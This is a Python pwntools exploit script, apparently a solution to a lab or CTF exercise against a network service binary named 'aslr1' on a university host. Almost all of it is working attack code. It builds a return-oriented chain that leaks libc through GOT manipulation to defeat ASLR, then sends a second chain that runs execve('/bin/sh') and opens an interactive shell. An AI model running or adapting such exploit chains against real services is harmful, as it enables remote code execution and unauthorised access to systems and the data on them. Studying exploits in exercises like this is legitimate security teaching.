from pwn import *

def mkrop(pad, libc_base):
    rebase_0 = lambda x: p64(x + libc_base)
    rop = pad
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += p64(0x0000000000000000)
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000026796) # 0x0000000000026796: pop rdi; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x000000000002890f) # 0x000000000002890f: pop rsi; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x00000000000cb1cd) # 0x00000000000cb1cd: pop rdx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x000000000003ee88) # 0x000000000003ee88: pop rax; ret; 
    rop += p64(0x000000000000003b)
    rop += rebase_0(0x00000000000580da) # 0x00000000000580da: syscall; ret; 
    return rop

def get_process():
    if args.REMOTE:
        return remote("lettieri.iet.unipi.it", 4441)
    else:
        return remote("127.0.0.1", 4441)
    
elf = ELF('./aslr1')
context.binary = elf
libc = ELF('./libc.so.6')
#p = get_process()

# Gather info
libc_fork_offset = libc.symbols['fork']
print(f"fork offset in libc: {hex(libc_fork_offset)}")
libc_write_offset = libc.symbols['write']
print(f"write offset in libc: {hex(libc_write_offset)}")
fork_got = elf.got['fork']
print(f"fork@got: {hex(fork_got)}")
fork_plt = elf.plt['fork']
print(f"fork@plt: {hex(fork_plt)}")

# First stage: leak libc base address
setsockopt_got = elf.got['setsockopt']
print(f"setsockopt@got: {hex(setsockopt_got)}")
libc_setsockopt_offset = libc.symbols['setsockopt']
print(f"setsockopt offset in libc: {hex(libc_setsockopt_offset)}")

# rop gadgets 
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
print(f"pop rdi ; ret gadget: {hex(pop_rdi)}")
pop_rsi_r15 = rop.find_gadget(['pop rsi','pop r15','ret'])[0]
print(f"pop rsi ; ret gadget: {hex(pop_rsi_r15)}")
add_qword_ptr_r15_rdi = 0x0000000000401206 # add qword ptr [r15], rdi ; ret


pad = b'A' * 40  # buffer size + saved rbp
payload = pad
payload += p64(pop_rdi)
payload += p64(libc_write_offset - libc_fork_offset) 

payload += p64(pop_rsi_r15)
payload += p64(setsockopt_got)
payload += p64(fork_got)

payload += p64(add_qword_ptr_r15_rdi)

payload += p64(pop_rdi)
payload += p64(1)  # stdout
payload += p64(fork_plt)

p = get_process()
p.sendline(payload)
# Receive leaked address
leaked_setsockopt_addr = u64(p.recv(8).strip().ljust(8, b'\x00'))
print(f"Leaked setsockopt address: {hex(leaked_setsockopt_addr)}")
libc_base = leaked_setsockopt_addr - libc_setsockopt_offset
print(f"Calculated libc base address: {hex(libc_base)}")
p.close()

p = get_process()
rop = mkrop(pad, libc_base)
p.sendline(rop)
p.sendline(b'/bin/sh')
try:
    p.interactive()
except Exception as e:
    print(f"Could not interact: {e}")
    exit(1)
    